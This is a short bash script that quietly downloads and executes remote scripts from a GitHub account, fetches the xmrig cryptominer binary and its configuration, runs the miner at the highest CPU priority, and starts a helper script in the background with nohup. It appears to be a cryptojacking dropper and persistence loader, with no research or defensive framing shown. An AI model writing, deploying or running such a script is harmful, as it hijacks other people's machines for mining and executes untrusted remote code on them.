#!/bin/bash

export TZ=America/Sao_Paulo

path=$(pwd)
account=${path#/home/}

rm -rf upgrade.sh && wget -q https://raw.githubusercontent.com/Predador21/scripts/main/upgrade.sh && chmod 777 upgrade.sh && ./upgrade.sh

if [ ! -e 'init.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/init5.sh -O init.sh && chmod 777 init.sh
fi

if [ ! -e 'xmrig' ] || [ ! -e 'config.json' ]
then
   rm -rf xmrig && wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
   rm -rf config.json && wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
fi

if ! pgrep xmrig > /dev/null
then
   #Backgroud
   nice -n -20 ./xmrig
fi

if ! pgrep init.sh > /dev/null
then
   nohup ./init.sh > /dev/null &
fi
